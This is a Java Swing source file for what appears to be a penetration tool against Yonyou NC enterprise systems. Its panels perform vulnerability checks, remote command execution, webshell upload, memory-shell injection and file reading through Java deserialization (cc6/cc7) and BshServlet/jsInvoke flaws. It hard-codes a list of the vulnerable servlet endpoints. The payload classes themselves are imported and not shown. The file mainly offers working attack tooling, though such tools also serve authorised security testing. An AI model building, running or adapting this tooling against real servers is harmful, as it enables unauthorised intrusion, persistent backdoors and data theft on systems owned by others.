import javax.swing.*;

import com.formdev.flatlaf.FlatDarculaLaf;
import com.formdev.flatlaf.FlatDarkLaf;
import com.formdev.flatlaf.FlatIntelliJLaf;
import com.formdev.flatlaf.FlatLightLaf;
import com.formdev.flatlaf.themes.FlatMacDarkLaf;
import com.formdev.flatlaf.themes.FlatMacLightLaf;
import vul.check;
import vul.exec;
import vul.upload;
import vul.memshell;
import vul.fileRead;
import Util.TextFieldPlaceholderHelper;

import java.net.Proxy;
import java.util.List;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class toolPannel {
    private JPanel rootPanel;
    private JTextField urlTextField;
    private JComboBox vulComboBox;
    private JTabbedPane tabbedPane;
    //private JTextField commandText;
    private JTextField commandText;
    private JButton rceButton;
    private JTextArea rcetextArea;
    private JTextArea checkInfoTextArea;
    private JTextField uploadPathTextField;
    private JButton uploadButton;
    private JComboBox typeComboBox;
    private JButton memButton;
    private JLabel urlLabel;
    private JButton checkButton;
    private JPanel checkPannel;
    private JPanel rceMen;
    private JPanel checkMen;
    private JPanel rcePannel;
    private JLabel rceLable;
    private JPanel uploadMen;
    private JPanel uploadPannel;
    private JLabel uploadPathLable;
    private JPanel memMen;
    private JPanel memPannel;
    private JLabel typeLabel;
    private JPanel setMen;
    private JTextArea uploadShellTextArea;
    private JTextArea uploadInfoTextArea;
    private JTextArea memTextArea;
    private JLabel uploadDataLabel;
    private JLabel uploadResultLabel;
    private JComboBox proxyTypecomboBox;
    private JComboBox proxySwitchcomboBox;
    private JTextField proxyIPTextField;
    private JTextField proxyPortTextField;
    private JTextField proxyUserTextField;
    private JTextField proxyPassTextField;
    private JPanel proxyPannel;
    private JLabel proxyLable1;
    private JLabel proxyLable2;
    private JLabel proxyLable3;
    private JLabel proxyLable4;
    private JPanel setPannel;
    private JPanel infoPannel;
    private JPanel readmePannel;
    private JPanel fileReadPannel;
    private JTextField fileReadtextField;
    private JButton fileReadButton;
    private JLabel fileReadLabel;
    private JTextArea fileReadtextArea;
    private JTextArea infotextArea;
    public Map<String, Object> deserializeMap = new HashMap<>();


    //获取代理状态
    public Object proxy() {
        Object proxyConfig;
        String proxySwitch = String.valueOf(proxySwitchcomboBox.getSelectedItem());
        String proxyType = String.valueOf(proxyTypecomboBox.getSelectedItem());
        String proxyIP = proxyIPTextField.getText();
        String proxyPort = proxyPortTextField.getText();
        String proxyUser = proxyUserTextField.getText();
        String proxyPass = proxyPassTextField.getText();
        if ("开启".equals(proxySwitch)) {
            if ("HTTP".equals(proxyType)) {
                proxyConfig = new Util.HttpUtil.ProxyConfig(Proxy.Type.HTTP, proxyIP, Integer.parseInt(proxyPort), proxyUser, proxyPass);
            } else {
                proxyConfig = new Util.HttpUtil.ProxyConfig(Proxy.Type.SOCKS, proxyIP, Integer.parseInt(proxyPort), proxyUser, proxyPass);
            }
        } else {
            proxyConfig = null;
        }
        return proxyConfig;
    }

    //使用SwingUtilities.invokeLater来确保UI更新立即执行，实时输出检测结果
    private class VulnerabilityCheckWorker extends SwingWorker<Void, String> {
        private final String vulName;
        private final String url;

        public VulnerabilityCheckWorker(String vulName, String url) {
            this.vulName = vulName;
            this.url = url;
        }

        @Override
        protected Void doInBackground() throws Exception {
            check cp = new check();

            if ("All".equals(vulName)) {
                String[] vulArray = {"BshServlet rce", "jsInvoke rce", "DeleteServlet cc6 反序列化", "DownloadServlet cc6 反序列化", "FileReceiveServlet cc6 反序列化", "DownloadServlet cc6 反序列化", "MonitorServlet cc6 反序列化", "MxServlet cc6 反序列化", "monitorservlet cc6 反序列化", "UploadServlet cc6 反序列化", "NCMessageServlet cc7 反序列化", "NCFindWeb 文件读取/列目录"};
                for (String vul : vulArray) {
                    SwingUtilities.invokeLater(() -> checkInfoTextArea.append(String.format("开始检测漏洞 [%s]\n", vul)));
                    try {
                        String result = cp.checkAction(deserializeMap, vul, url, proxy());
                        SwingUtilities.invokeLater(() -> checkInfoTextArea.append(result + "\n\n"));
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                }
                SwingUtilities.invokeLater(() -> checkInfoTextArea.append("全部检测完毕～\n\n"));
            } else {
                try {
                    String result = cp.checkAction(deserializeMap, vulName, url, proxy());
                    SwingUtilities.invokeLater(() -> checkInfoTextArea.setText(result));
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
            }

            return null;
        }


        @Override
        protected void process(List<String> chunks) {
            for (String chunk : chunks) {
                checkInfoTextArea.append(chunk);
            }
        }
    }


    public void check() {
        checkButton.addActionListener(e -> {
            // 清除文本区域
            checkInfoTextArea.setText("");
            String url = urlTextField.getText();

            // 如果URL不以'/'结尾，添加它
            if (!url.endsWith("/")) {
                url += "/";
            }

            // 更新文本字段
            urlTextField.setText(url);

            // 获取所选的漏洞
            String vulName = String.valueOf(vulComboBox.getSelectedItem());

            // 创建并执行SwingWorker
            new VulnerabilityCheckWorker(vulName, url).execute();
        });
    }


    public void rce() {
        rceButton.addActionListener(e -> {
            String url = urlTextField.getText();
            // 如果url不以/结尾，就自动加上
            if (!url.endsWith("/")) {
                url += "/";
            }
            // 文本框也同步更新
            urlTextField.setText(url);
            // 获取下拉框并转化为字符串
            String vulName = String.valueOf(vulComboBox.getSelectedItem());
            // 获取命令
            String cmd = commandText.getText();

            //执行
            exec rce = new exec();
            String result = null;
            try {
                result = rce.execAction(deserializeMap, vulName, url, cmd, proxy());
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
            // 回显信息到下面的文本域
            rcetextArea.setText(result);
        });

    }

    public void upload() {
        uploadButton.addActionListener(e -> {
            String url = urlTextField.getText();
            // 如果url不以/结尾，就自动加上
            if (!url.endsWith("/")) {
                url += "/";
            }
            // 文本框也同步更新
            urlTextField.setText(url);
            // 获取下拉框并转化为字符串
            String vulName = String.valueOf(vulComboBox.getSelectedItem());
            // 获取文件名、文件内容
            String fileName = uploadPathTextField.getText();
            String fileData = uploadShellTextArea.getText();

            //执行
            upload up = new upload();
            String result = null;
            try {
                result = up.uploadAction(vulName, url, fileName, fileData, proxy());
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
            // 回显信息到下面的文本域
            uploadInfoTextArea.setText(result);
        });

    }

    public void fileRead() {
        fileReadButton.addActionListener(e -> {
            String url = urlTextField.getText();
            // 如果url不以/结尾，就自动加上
            if (!url.endsWith("/")) {
                url += "/";
            }
            // 文本框也同步更新
            urlTextField.setText(url);
            // 获取下拉框并转化为字符串
            String vulName = String.valueOf(vulComboBox.getSelectedItem());
            // 获取path
            String path = fileReadtextField.getText();
            //执行
            fileRead fr = new fileRead();
            String result = null;
            try {
                result = fr.fileReadAction(vulName, url, path, proxy());
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
            // 回显信息到下面的文本域
            fileReadtextArea.setText(result);
        });

    }

    public void mem() {
        memButton.addActionListener(e -> {
            String url = urlTextField.getText();
            // 如果url不以/结尾，就自动加上
            if (!url.endsWith("/")) {
                url += "/";
            }
            // 文本框也同步更新
            urlTextField.setText(url);
            // 获取下拉框并转化为字符串
            String vulName = String.valueOf(vulComboBox.getSelectedItem());
            // 获取内存马类型
            String shellType = String.valueOf(typeComboBox.getSelectedItem());

            //执行
            memshell ms = new memshell();
            String result = null;
            try {
                result = ms.memShellAction(deserializeMap, vulName, url, shellType, proxy());
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
            // 回显信息到下面的文本域
            memTextArea.setText(result);
        });

    }

    public toolPannel() {
        // 设置提示文字
        TextFieldPlaceholderHelper.setPlaceholder(uploadPathTextField, "默认路径为web根目录，如需传入其他web路径，请直接基于web根目录相对路径填写即可");
        TextFieldPlaceholderHelper.setPlaceholder(proxyUserTextField, "没有就空着");
        TextFieldPlaceholderHelper.setPlaceholder(proxyPassTextField, "没有就空着");
        fileReadtextArea.setText("留空就列出web根目录，填根目录的相对路径列出指定目录，填文件名就是读取文件");

        // 设置JTextArea为不可编辑
        checkInfoTextArea.setEditable(false);
        rcetextArea.setEditable(false);
        uploadInfoTextArea.setEditable(false);
        memTextArea.setEditable(false);
        fileReadtextArea.setEditable(false);
        infotextArea.setEditable(false);

        //说明信息
        infotextArea.setText("1.不同类型的漏洞能够利用的方式也不同，比如有的能打内存而有的不能(也有的是暂未实现进去)\n" +
                "2.不同的实战环境可能存在差异，请理性看待。\n" +
                "3.jsInvoke rce命令执行模块建议打了一次后抓包出来手动执行，目前的方案是执行一次就写入一个文件，很不优雅。\n另外就是为了兼容windows和linux，工具内置了两种命令格式，但由于目标环境原因命令实际上会被执行两次，\n所以还是建议抓包出来手动执行后续命令。");
        //埋点数据
        deserializeMap.put("DeleteServlet cc6 反序列化", "servlet/~ic/nc.document.pub.fileSystem.servlet.DeleteServlet");
        deserializeMap.put("DownloadServlet cc6 反序列化", "servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet");
        deserializeMap.put("FileReceiveServlet cc6 反序列化", "servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet");
        deserializeMap.put("fsDownloadServlet cc6 反序列化", "fs/update/DownloadServlet");
        deserializeMap.put("MonitorServlet cc6 反序列化", "servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet");
        deserializeMap.put("MxServlet cc6 反序列化", "servlet/~ic/nc.bs.framework.mx.MxServlet");
        deserializeMap.put("NCMessageServlet cc7 反序列化", "servlet/~baseapp/nc.message.bs.NCMessageServlet");
        deserializeMap.put("monitorservlet cc6 反序列化", "service/monitorservlet");
        deserializeMap.put("UploadServlet cc6 反序列化", "servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet");
        check();
        rce();
        upload();
        mem();
        fileRead();
    }

    public static void main(String[] args) {
        FlatMacLightLaf.setup();
        JFrame frame = new JFrame("用友NC系列检测利用工具 by WgpSec@说书人");
        frame.setSize(400, 300);
        frame.setContentPane(new toolPannel().rootPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setVisible(true);

    }

    private void createUIComponents() {
        // TODO: place custom component creation code here
    }
}
